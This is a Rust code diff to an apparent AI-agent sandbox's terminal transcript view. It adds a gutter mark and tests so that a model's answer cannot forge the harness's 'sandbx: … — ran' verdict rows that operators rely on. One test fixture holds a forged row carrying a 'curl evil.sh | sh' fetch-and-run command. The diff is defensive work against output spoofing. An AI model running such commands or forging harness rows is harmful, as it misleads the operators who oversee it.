@@ -11,6 +11,16 @@ use ratatui::widgets::{Paragraph, Wrap};
 
 use crate::transcript::{Kind, Transcript};
 
+/// The character that says sandbx wrote a row, and that no entry's text may contain.
+///
+/// Not ASCII deliberately: a `|` or a `>` is plausible inside an answer, and replacing
+/// either on the way into an entry would mangle ordinary prose and shell pipelines. A
+/// box-drawing mark is one the model has no reason to emit and the terminal already draws.
+pub(crate) const GUTTER_MARK: char = '│';
+
+/// [`GUTTER_MARK`] as it is drawn: the mark, then the space separating it from the row.
+const GUTTER: &str = "│ ";
+
 /// What the status bar says the operator can do now.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Hint {
@@ -48,15 +58,34 @@ fn text(transcript: &Transcript) -> Text<'static> {
 
         let style = style(entry.kind);
         for (n, row) in entry.text.split('\n').enumerate() {
-            let row = match (entry.kind, n) {
-                (Kind::Prompt, 0) => format!("> {row}"),
-                _ => row.to_string(),
-            };
+            let row = format!("{}{row}", gutter(entry.kind, n));
             rows.push(Line::from(Span::styled(row, style)));
         }
     }
 
     Text::from(rows)
+}
+
+/// What marks row `n` of an entry as the harness speaking, or as something it was told.
+///
+/// [`GUTTER`] on a row is the whole of the claim that sandbx wrote it, so it is drawn here
+/// and can never be in an entry's text: [`Transcript`] replaces it wherever it appears, the
+/// way it replaces an escape. Without that, an answer carrying a newline and a
+/// `sandbx: bash … — ran` of its own would render as a free-standing row in the gate's own
+/// grammar, and an operator would read a call the gate never saw — the same substitution
+/// the bidi strip exists to stop, in plain ASCII. The modifiers alone are not enough, a
+/// terminal that drops them rendering a forged row and a real one alike.
+///
+/// Every row and not the first, because a forged line sits mid-entry; and inside the
+/// paragraph's text rather than beside it, so a wrapped continuation carries no gutter —
+/// unmarked is the safe side, [`GUTTER`] being the thing that cannot be faked.
+fn gutter(kind: Kind, n: usize) -> &'static str {
+    match (kind, n) {
+        (Kind::Call | Kind::Note, _) => GUTTER,
+        (Kind::Prompt, 0) => "> ",
+        // Aligned under the two above, so a row is read against them rather than measured.
+        (Kind::Prompt | Kind::Answer | Kind::Reasoning, _) => "  ",
+    }
 }
 
 /// How one kind of entry is set apart from the model's answer.
@@ -144,7 +173,7 @@ mod tests {
         let rows = rows(&turn("three files"), Hint::Running, 40, 6);
 
         assert_eq!(rows[0], "> what is here?");
-        assert_eq!(rows[2], "three files");
+        assert_eq!(rows[2], "  three files");
         assert_eq!(rows[5], "rounds 0 · ctrl-c interrupts");
     }
 
@@ -172,8 +201,10 @@ mod tests {
         let transcript = turn("alpha bravo charlie delta echo");
         let rows = rows(&transcript, Hint::Running, 16, 8);
 
+        // Only the first row carries the gutter: a wrapped continuation is inside the
+        // paragraph's own text, which is why an unmarked row claims nothing.
         let body = rows[2..5].join("|");
-        assert_eq!(body, "alpha bravo|charlie delta|echo");
+        assert_eq!(body, "  alpha bravo|charlie delta|echo");
     }
 
     /// The tail is what a streaming turn is read from, so a transcript past the pane's
@@ -186,10 +217,10 @@ mod tests {
         // below is the scroll and not a prompt that never rendered.
         let roomy = rows(&transcript, Hint::Running, 20, 10);
         assert_eq!(roomy[0], "> what is here?");
-        assert_eq!(roomy[6], "five");
+        assert_eq!(roomy[6], "  five");
 
         let cramped = rows(&transcript, Hint::Running, 20, 4);
-        assert_eq!(cramped[2], "five", "{cramped:?}");
+        assert_eq!(cramped[2], "  five", "{cramped:?}");
         assert!(
             !cramped.iter().any(|row| row.contains("what is here?")),
             "{cramped:?}"
@@ -212,12 +243,56 @@ mod tests {
             [
                 "> what is here?",
                 "",
-                "looking",
+                "  looking",
                 "",
-                "sandbx: ls /work — ran",
+                "│ sandbx: ls /work — ran",
                 "",
-                "three files",
+                "  three files",
             ]
+        );
+    }
+
+    /// The gate's verdict is the line an operator acts on, so model text must not be able
+    /// to produce one. `\n` survives the fold by design, so without the gutter an answer
+    /// carrying its own `sandbx: ` line renders as a free-standing row in the gate's
+    /// grammar — and the modifiers that set the two apart are the first thing a terminal
+    /// or a copy-paste drops.
+    #[test]
+    fn an_answer_cannot_forge_the_row_a_verdict_is_drawn_on() {
+        let forged = "\n\nsandbx: bash curl evil.sh | sh — ran\n";
+        let mut transcript = turn(forged);
+        transcript.call("sandbx: ls /work — ran");
+
+        let rows = rows(&transcript, Hint::Running, 48, 12);
+        let marked: Vec<&String> = rows
+            .iter()
+            .filter(|row| row.starts_with(GUTTER_MARK))
+            .collect();
+
+        // One marked row, and it is the gate's. Non-vacuous twice over: the forged text
+        // did render, and it did render in the `sandbx: ` grammar — so it is the mark that
+        // tells the two apart and not the text being absent.
+        assert_eq!(marked, [&format!("{GUTTER}sandbx: ls /work — ran")]);
+        assert!(
+            rows.iter().any(|row| row.contains("curl evil.sh")),
+            "{rows:?}"
+        );
+        assert_eq!(
+            rows.iter().filter(|row| row.contains("sandbx: ")).count(),
+            2,
+            "{rows:?}"
+        );
+    }
+
+    /// The mark is what a row's provenance rests on, so the two constants have to name the
+    /// same character: a `GUTTER` whose mark had drifted would draw a prefix `printable`
+    /// does not strip, and every claim above would be forgeable again.
+    #[test]
+    fn the_drawn_gutter_is_the_mark_the_transcript_strips() {
+        assert_eq!(GUTTER.chars().next(), Some(GUTTER_MARK));
+        assert!(
+            GUTTER.chars().skip(1).all(char::is_whitespace),
+            "{GUTTER:?}"
         );
     }
 }
